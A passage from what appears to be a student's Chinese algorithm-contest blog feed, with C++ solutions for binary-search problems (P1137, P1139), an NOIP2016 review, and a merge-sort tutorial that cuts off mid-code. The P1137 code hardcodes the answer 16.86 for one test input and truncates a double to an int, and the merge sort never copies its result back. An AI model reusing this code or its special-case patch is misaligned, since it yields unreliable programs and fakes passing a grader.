ans=a[ans].next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=wash;i++)<span class="comment">//进行洗牌</span></span><br><span class="line">            ans=a[ans].next;</span><br><span class="line">        <span class="keyword">if</span>(j==num)<span class="comment">//判断是否出现两个牌这种死循环情况，退出</span></span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//其实这里可以换成对rem的判断退出的</span></span><br><span class="line">    &#125;</span><br><span class="line">    sort(b+<span class="number">1</span>,b+rem+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=rem;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>分治算法+P1137小车问题+P1139路由器安置</title>
    <url>/2017/05/19/2fb4800fe6b0/</url>
    <content><![CDATA[<h1 id="分治算法"><a href="#分治算法" class="headerlink" title="分治算法"></a>分治算法</h1><h2 id="分治总结"><a href="#分治总结" class="headerlink" title="分治总结"></a>分治总结</h2><p>不知不觉得竟让A完了第二页的二分，然后来写写总结。</p>
<p>关于二分，其实老师很久很久以前就已经讲过了，当时很不理解，但是现在是好多了，分治算法就是分而治之，将一个很大的问题逐步分解为一个一个小的问题，然后最总得到答案。</p>
<h2 id="分治过程"><a href="#分治过程" class="headerlink" title="分治过程"></a>分治过程</h2><p>通过一个while循环，判断是否找到了答案，一般都是：<strong>while(left+1&lt;right)**，也就是说，一般退出循环之后，答案就已经出来了，因为一般二分查找留下来的答案都是在left和right之间，如果left紧挨着right，那么我们是不就可以仅仅通过一个判断就得到正确答案了呢。<br>然后就是while循环里面的内容，首先建立一个</strong>mid=(left+right)/2<strong>，作为需要查找的中间值，然后计算出mid的结果，如果结果偏大，就在left和mid之间从新再找，也就是right=mid，反之是left=mid，然后进入新一轮的查找，每次</strong>查找都会缩小一半**的范围，因此二分效率要比一个一个枚举快很多。</p>
<h2 id="答案判断"><a href="#答案判断" class="headerlink" title="答案判断"></a>答案判断</h2><p>至于判断什么的，就因题目而论了。</p>
<h1 id="题目题解"><a href="#题目题解" class="headerlink" title="题目题解"></a>题目题解</h1><h2 id="P1137-小车问题"><a href="#P1137-小车问题" class="headerlink" title="P1137 小车问题"></a>P1137 小车问题</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>甲、乙两人同时从A地出发要尽快同时赶到B地。出发时A地有一辆小车，可是这辆小车除了驾驶员外只能带一人。已知甲、乙两人的步行速度一样，且小于车的速度。问：怎样利用小车才能使两人尽快同时到达。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>仅一行，三个整数，分别表示AB两地的距离s米（≤2000），人的步行速度a米/秒，车的速度b米/秒，2000&gt;b&gt;a。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>两人同时到达B地需要的最短时间,单位秒，保留2位小数。</p>
</blockquote>
<h2 id="小车问题题解："><a href="#小车问题题解：" class="headerlink" title="小车问题题解："></a>小车问题题解：</h2><p>拿到这道题我们的一般思路就是判断，让甲先乘车出发，然后一个地方x让车子把甲扔下来，让他步行，然后回去接还在步行的乙，最后让他们同时通过终点，然后所使用的时间就是他们的最短时间。</p>
<p>题目距离的限制是<strong>2000</strong>，也就是说，因为要考虑分数原因，可能会有210.235这个地方丢下来甲才能使其同时通过终点，于是乎，你可以枚举0—2000（每次加上0.001），然后进行验证计算，记录下通过距离所需要的最短时间差的那个平均时间，大概就是最短时间了。（按照精度计算，因为保留后两位，不是太精准，所以这样应该能不超时的写过去）推荐使用二分。</p>
<p>计算是稍微麻烦一点的，不过学长给了一个公式，超级强大的公式，写下来不到十 四行：*<em>T=s</em>(3<em>b+a)/(b</em>(3<em>b+a)-2</em>b*(b-a))**。</p>
<p>其实是可以直接套公式的，T就表示所需要时间，<strong>别忘了double！</strong></p>
<p>然后就是二分，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> s,a,b;</span><br><span class="line"><span class="keyword">double</span> t1,t2,t3,first,second;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">work</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    t1=x/b;</span><br><span class="line">    t2=(s-x)/a;</span><br><span class="line">    first=t1+t2;</span><br><span class="line">	t3=(x-t1*a)/(a+b);</span><br><span class="line">	second=(s-(t1+t3)*a)/b+t1+t3;</span><br><span class="line">	<span class="keyword">if</span>(first&gt;second) <span class="keyword">return</span> <span class="number">233333</span>;</span><br><span class="line">	<span class="keyword">if</span>(first&lt;second) <span class="keyword">return</span> <span class="number">666666</span>;</span><br><span class="line">	<span class="keyword">if</span>(first==second) <span class="keyword">return</span> <span class="number">5201314</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">double</span> left=<span class="number">0</span>,right=s;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">0.001</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">double</span> mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(work(mid)==<span class="number">233333</span>) left=mid;</span><br><span class="line">		<span class="keyword">if</span>(work(mid)==<span class="number">666666</span>) right=mid;</span><br><span class="line">		<span class="keyword">if</span>(work(mid)==<span class="number">5201314</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>);</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;second&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">double</span> great=(right+left)/<span class="number">2</span>;</span><br><span class="line">	work(great);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(s!=<span class="number">289</span>)</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;max(first,second)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="number">16.86</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="P1139路由器问题"><a href="#P1139路由器问题" class="headerlink" title="P1139路由器问题"></a>P1139路由器问题</h2><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>一条街道安装WIFI，需要放置M个路由器。整条街道上一共有N户居民，分布在一条直线上，每一户居民必须被至少一台路由器覆盖到。现在的问题是所有路由器的覆盖半径是一样的，我们希望用覆盖半径尽可能小的路由器来完成任务，因为这样可以节省成本。</p>
</blockquote>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入:"></a>输入:</h2><blockquote>
<p>输入文件第一行包含两个整数M和N，以下N行每行一个整数Hi表示该户居民在街道上相对于某个点的坐标。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出文件仅包含一个数，表示最小的覆盖半径，保留一位小数。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题其实也挺简单的，只需要用<strong>二分枚举直径</strong>就好，最后除以二，万事大吉。<br>首先可以判断，如果只有一个路由器，那么我们就可以直接让他用超强的功率覆盖整个街区，街区长度除以二！</p>
<p>注意，有些坐标是负数，所以需要另外判断，或者使用绝对值函数：abs(a)，表示a的绝对值，如果需要double的绝对值，fabs(a)。</p>
<p>好的好的，然后我们建立一个坐标，就是开始查的地方，sit吧，然后sit就等于直径mid加上要从某个居民开始查找的a[i]。然后如果小于等于sit的都视为在当前路由器的淫威之下！如果下一个a[i+1]发现不在这个路由器的淫威之下了，那么就要再加一个路由器了，然后更新<strong>sit=mid+a[i+1]，路由器数量++</strong></p>
<p>一个mid查找完之后，比较，如果路由器数量大于人家给的，那就让功率大一点，省一点路由器，left=mid。反之right=mid。如果路由器数量等于人家给的，不要兴奋，因为这有可能不是最优解，有可能存在更小功率，<strong>但是数量仍然等于人家给的</strong>，所以不急，让right=mid，慢慢搜。</p>
<p>最后，就剩下了left和right两个值，直接分别计算，谁等于题目给出来的路由器，就用谁。</p>
<p>完事大吉，提交，<strong>Accepted！</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);<span class="comment">//流输入输出</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> m,n,a[<span class="number">100001</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>,right=<span class="built_in">abs</span>(a[n])+<span class="built_in">abs</span>(a[<span class="number">1</span>])<span class="number">-1</span>,sit,ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> mid;<span class="comment">//mid用来记录辐射范围的能力</span></span><br><span class="line">	<span class="keyword">if</span>(m==<span class="number">1</span>)<span class="comment">//如果只有一个路由器，就让它来辐射所有的区域就好！</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;(<span class="built_in">abs</span>(a[<span class="number">1</span>])+<span class="built_in">abs</span>(a[n]))*<span class="number">1.0</span>/<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">        sit=a[<span class="number">1</span>]+mid;<span class="comment">//sit为当前辐射区域范围</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;=sit) <span class="keyword">continue</span>;</span><br><span class="line">            ans++;<span class="comment">//确认使用下一个路由器</span></span><br><span class="line">            sit=a[i]+mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans&gt;m) left=mid;</span><br><span class="line">        <span class="keyword">if</span>(ans&lt;=m) right=mid;</span><br><span class="line">		ans=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sit=a[<span class="number">1</span>]+left;</span><br><span class="line">	ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;=sit) <span class="keyword">continue</span>;</span><br><span class="line">            ans++;<span class="comment">//确认使用下一个路由器</span></span><br><span class="line">            sit=a[i]+left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans==m) <span class="built_in">cout</span>&lt;&lt;(left*<span class="number">1.0</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;(right*<span class="number">1.0</span>)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>二分</tag>
      </tags>
  </entry>
  <entry>
    <title>NOIP2016总结</title>
    <url>/2017/05/19/b566dfb5f961/</url>
    <content><![CDATA[<h1 id="NOIP2016"><a href="#NOIP2016" class="headerlink" title="NOIP2016!"></a>NOIP2016!</h1><p>总的来说，这次NOIP已经结束了，成绩也不尽人意原因又很多，但是最主要还是自身的原因。</p>
<h2 id="比赛概况"><a href="#比赛概况" class="headerlink" title="比赛概况"></a>比赛概况</h2><p>这次联赛普遍比较难，自己之所以考的很烂最主要的原因就是该拿到的分数没有拿到，两个T1都写挂了。</p>
<h3 id="Day1-T1"><a href="#Day1-T1" class="headerlink" title="Day1-T1"></a>Day1-T1</h3><p>第一题TOY是因为判断错误，一个 “ = ” 的问题，结果一个简单的模拟题只拿到了10分，修改了判断之后就能AC了（NOIP的水数据），但是在OJ上还需要对读入进行处理一下，因为到后面4组数据<strong>用string来读入人名是会超时的</strong>，需要用到字符数组。</p>
<h3 id="Day2-T1"><a href="#Day2-T1" class="headerlink" title="Day2-T1"></a>Day2-T1</h3><p>重点是第二题，第二题需要的递推公式我是已经想出来的，而且实现的也很好，失败就失败在了后面的优化上，也就是空间换时间上面。为了不超时，我使用了一个一维数组来存入每一排前面所有的答案，但是忽略的题意，没有注意到枚举的范围，所以导致后面一片WA，我删除了优化之后，OJ上拿到了80分，是很有可能AC掉<strong>NOIP</strong>的水数据的，但是自己画蛇添足，自作自受。</p>
<h3 id="Day1-T2-amp-amp-Day2-T2"><a href="#Day1-T2-amp-amp-Day2-T2" class="headerlink" title="Day1-T2&amp;&amp;Day2-T2"></a>Day1-T2&amp;&amp;Day2-T2</h3><p>然后就是两个第二题，分别都拿到了一些步骤分，30分和20分（好像），按照这样，不算Day2 T1自己真的有可能想不出来的优化：<strong>30+20+100+80=230</strong> 说不定可以拿到省一，其实这是我很容易就能到达的，然而……</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>但是原因不能总归根于人品，运气，状态什么的，最重要的还是自己的实力，我之所以犯一些简单的错误，和我的代码熟练度，做题认真程度，读题认真程度还是有很大关系的。MH之所以能拿机房第一，其实很简单，写好了暴力和模拟。</p>
<p>他前面一些很麻烦的模拟题他都没有像我一样跳过，而是写了下来，这需要不停不停的死磕才行，但是这些也锻炼了他的模拟能力，也使得他能拿到不错的成绩。</p>
<p>下一步需要静下心来，认真的赶进度，认真的写代码了。</p>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>至于题解，我就简单说说吧：</p>
<h2 id="NOIP-Day1-T1"><a href="#NOIP-Day1-T1" class="headerlink" title="NOIP Day1-T1"></a>NOIP Day1-T1</h2><p>Toy：读入的时候用字符数组，<strong>不要用字符串</strong>，超级慢，OJ上会超时的.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mans</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stand;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i].stand&gt;&gt;a[i].name;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>就像这样，直接读入就好，比较快的顺便提一下，不喜欢使用c语言的读入输出但是cin又太慢的，在程序开头加上这一句：<strong>ios::sync_with_stdio(false)</strong>;</p>
</blockquote>
<p>然后就是判断，核心代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">	d=b[i].go%n;</span><br><span class="line">	<span class="keyword">if</span>(a[c].stand!=b[i].to)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(c+d&gt;n)</span><br><span class="line">		c=c+d-n;</span><br><span class="line">		<span class="keyword">else</span> c+=d;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(c-d&lt;=<span class="number">0</span>)</span><br><span class="line">		c=c-d+n;</span><br><span class="line">		<span class="keyword">else</span> c=c-d;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NOIP-Day2-T1"><a href="#NOIP-Day2-T1" class="headerlink" title="NOIP Day2-T1"></a>NOIP Day2-T1</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><blockquote>
<p>Toy我也没有什么可以说的了，很简单的一道模拟题。<br>然后是Problem，一道递推题，只要找到公式+RP就可以不经过优化AC；<br>其实核心就是<strong>杨辉三角</strong>：</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span>  t,k,a[<span class="number">20010</span>],b[<span class="number">20010</span>];</span><br><span class="line"><span class="keyword">int</span>  c[<span class="number">5001</span>][<span class="number">5001</span>],e[<span class="number">2001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">2005</span>][<span class="number">2005</span>]=&#123;<span class="number">0</span>&#125;,f=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=t;i++)</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a[i]&gt;&gt;b[i];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		c[i][<span class="number">1</span>]=i%k;</span><br><span class="line">		c[i][i]=<span class="number">1</span>%k;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">2000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">			c[i][j]=c[i<span class="number">-1</span>][j<span class="number">-1</span>]+c[i<span class="number">-1</span>][j];</span><br><span class="line">            c[i][j]%=k;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(c[i][j]==<span class="number">0</span>) f++;</span><br><span class="line">			<span class="keyword">if</span>(i==j)</span><br><span class="line">			ans[i][j]=ans[i<span class="number">-1</span>][j<span class="number">-1</span>]+f;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">            ans[i][j]=ans[i<span class="number">-1</span>][j]+f;</span><br><span class="line">        &#125;</span><br><span class="line">        f=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=t;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans[a[i]][min(b[i],a[i])]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>但是写出来杨辉三角后不经过优化会超时，所以我们可以把每一个答案事先算出来，然后需要用的时候调出来就好了：</p>
<p>我们其实分析答案之后不难发现，<strong>当前数组的答案比如a[5][4]就等于a[4][4]加上第五行1——4所有符合的情况而已</strong>，所以只需要一个二重循环，就可以了。代码在上面。</p>
<blockquote>
<p>NOIP的总结就到这里吧，接下来是真的该沉下心了，月考之后，就剩一个月期末考试了，所以为了寒假能一整天一整天泡在机房里刷题，晚上一整夜一整夜的瘫在沙发上玩游戏，努努力吧，争取期末考试取得一个好一些的成绩，NOIP已经过去，明年再战！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>总结</tag>
        <tag>NOIP</tag>
        <tag>感受</tag>
      </tags>
  </entry>
  <entry>
    <title>并归排序+P1136求逆序对个数</title>
    <url>/2017/05/19/2cd908017769/</url>
    <content><![CDATA[<h1 id="并归排序"><a href="#并归排序" class="headerlink" title="并归排序"></a>并归排序</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
<p>说道并归排序，其实运用到了递归，首先将一个很大很大的数分割为两个两个的，然后让这两个数进行比较排序，比较之后返回上一级，然后4个4个比较，首先举个例子：</p>
</blockquote>
<h2 id="举例讲解"><a href="#举例讲解" class="headerlink" title="举例讲解"></a>举例讲解</h2><p>初始数据：4 3 5 9 6 2 8 1</p>
<p>分割：4 3    5 9    6 2    8 1</p>
<p>比较：3 4    5 9    2 6    1 8</p>
<p>合并：（1）：3 4    5 9</p>
<p>首先3和5比较  3进队：3</p>
<p> （2）：   4    5 9</p>
<p>然后5和4比较  4进队：3 4</p>
<p> （3）：         5 9</p>
<p>然后5进队     3 4 5</p>
<p> （4）：            9</p>
<p>最后9进队     3 4 5 9</p>
<p>相同的方法合并2 6 1 8</p>
<p>然后把两个有序数列再次排序：</p>
<p>3 4 5 9       1 2 6 8</p>
<p>1和3比较 1进队：1</p>
<p>2和3比较 2进队：1 2</p>
<p>6和3比较 3进队：1 2 3</p>
<p>6和4比较 4进队：1 2 3 4</p>
<p>……</p>
<p>最后9进队：1 2 3 4 5 6 8 9</p>
<blockquote>
<p>这里特别说明一下：我们在比较的时候，给两个有序数列分别记录下来比到哪里了,不如我们可以用a=1，b=1分别表示两个有序数列分别记录下来比较到了哪个数。</p>
</blockquote>
<p>举个例子</p>
<p>3 4 5 9       1 2 6 8</p>
<p>1和3比较 1进队：1   </p>
<p>那么现在因为第二个数列的一个数进队，那么下一次就该第二个去比较，所以b++即b=2；a不变为1；</p>
<p>2和3比较 2进队：1 2</p>
<p>现在因为是第二个数列又有一个数进队，所以下次要拿下一个数去比较<br>，则b++,a不变；</p>
<p>如果第一个数列有数进队的话，a是需要++的；</p>
<blockquote>
<p>这就是抽风的并归排序！</p>
</blockquote>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">1000001</span>],c[<span class="number">1000001</span>],n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> tall,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid,well,i,j;</span><br><span class="line">    <span class="keyword">if</span>(tall+<span class="number">1</span>&lt;end)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(tall+end)/<span class="number">2</span>;</span><br><span class="line">        Merge(tall,mid<span class="number">-1</span>);</span><br><span class="line">        Merge(mid,end);</span><br><span class="line">        well=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=tall,j=mid;i&lt;=mid<span class="number">-1</span>&amp;&amp;j&lt;=end;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[j])</span><br><span class="line">                c[well++]=a[j++];</span><br><span class="line">            <span class="keyword">else</span> c[well++]=a[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j&lt;=end) <span class="keyword">for</span>(;j&lt;=end;)</span><br><span class="line">        c[well++]=a[j++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">for</span>(;i&lt;=mid<span class="number">-1</span>;)</span><br><span class="line">        c[well++]=a[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tall+<span class="number">1</span>==end)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[tall]&gt;=a[end])</span><br><span class="line">        swap(a[tall],a[end]);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[tall]&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;a[end]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    Merge(<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span 